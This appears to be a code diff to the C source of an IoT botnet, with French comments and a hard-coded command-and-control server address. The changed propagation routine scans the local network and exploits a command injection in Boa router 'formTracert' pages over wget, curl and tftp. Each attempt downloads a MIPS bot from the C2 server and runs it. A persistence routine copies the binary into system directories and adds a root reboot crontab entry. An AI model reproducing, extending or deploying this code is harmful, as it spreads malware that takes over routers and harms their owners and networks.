@@ -17,6 +17,7 @@
 #define C2_SERVER "51.68.128.169"
 #define C2_PORT 1337
 #define BUFFER_SIZE 1024
+#define CMD_SIZE 512
 
 // Fonction pour exécuter une commande shell et retourner la sortie
 char* execute_command(char* command) {
@@ -178,17 +179,38 @@ void auto_propagate() {
     if (f && fgets(localnet, sizeof(localnet), f)) {
         localnet[strcspn(localnet, "\n")] = 0;
         char ip[64];
+        char cmd[CMD_SIZE];
+        char wget_payload[CMD_SIZE];
+        char curl_payload[CMD_SIZE];
+        
+        // Préparer les payloads une seule fois
+        snprintf(wget_payload, sizeof(wget_payload), 
+            "rm -rf /var/tmp/bot;wget http://%s:1337/bot.mips -O /var/tmp/bot;chmod 777 /var/tmp/bot;/var/tmp/bot mips",
+            C2_SERVER);
+        
+        snprintf(curl_payload, sizeof(curl_payload),
+            "rm -rf /var/tmp/bot;curl -O http://%s:1337/bot.mips;chmod 777 /var/tmp/bot;/var/tmp/bot mips",
+            C2_SERVER);
+        
         for (int i = 1; i < 255; i++) {
             snprintf(ip, sizeof(ip), "%s.%d", localnet, i);
+            
             // Essayer wget
-            char cmd[256];
-            snprintf(cmd, sizeof(cmd), "wget -q -O- http://%s/boaform/admin/formTracert --post-data 'target_addr=%%3Brm%%20-rf%%20/var/tmp/bot%%3Bwget%%20http://%s:1337/bot.mips%%20-O%%20->/var/tmp/bot%%3Bchmod%%20777%%20/var/tmp/bot%%3B/var/tmp/bot%%20mips' > /dev/null 2>&1", ip, C2_SERVER);
+            snprintf(cmd, sizeof(cmd),
+                "wget -q -O- http://%s/boaform/admin/formTracert --post-data 'target_addr=%%3B%s' > /dev/null 2>&1",
+                ip, wget_payload);
             system(cmd);
+            
             // Essayer curl
-            snprintf(cmd, sizeof(cmd), "curl -s -X POST http://%s/boaform/admin/formTracert -d 'target_addr=%%3Brm%%20-rf%%20/var/tmp/bot%%3Bcurl%%20-O%%20http://%s:1337/bot.mips%%3Bchmod%%20777%%20/var/tmp/bot%%3B/var/tmp/bot%%20mips' > /dev/null 2>&1", ip, C2_SERVER);
+            snprintf(cmd, sizeof(cmd),
+                "curl -s -X POST http://%s/boaform/admin/formTracert -d 'target_addr=%%3B%s' > /dev/null 2>&1",
+                ip, curl_payload);
             system(cmd);
+            
             // Essayer tftp
-            snprintf(cmd, sizeof(cmd), "tftp %s -c get bot.mips /var/tmp/bot; chmod 777 /var/tmp/bot; /var/tmp/bot mips > /dev/null 2>&1", ip);
+            snprintf(cmd, sizeof(cmd),
+                "tftp %s -c get bot.mips /var/tmp/bot; chmod 777 /var/tmp/bot; /var/tmp/bot mips > /dev/null 2>&1",
+                ip);
             system(cmd);
         }
     }
@@ -360,11 +382,11 @@ void daemonize() {
 
 // Fonction pour persister sur le système
 void persist() {
-    char command[BUFFER_SIZE*2];
+    char command[BUFFER_SIZE*4];
     char path[BUFFER_SIZE];
     if (readlink("/proc/self/exe", path, BUFFER_SIZE) == -1) return;
     // Copie dans plusieurs emplacements
-    sprintf(command, "cp %s /usr/bin/sysupdate; cp %s /bin/sysupdate; cp %s /etc/sysupdate", path, path, path);
+    snprintf(command, sizeof(command), "cp %s /usr/bin/sysupdate; cp %s /bin/sysupdate; cp %s /etc/sysupdate", path, path, path);
     system(command);
     // Ajout à la crontab root
     system("(crontab -l 2>/dev/null; echo '@reboot /usr/bin/sysupdate') | crontab -");
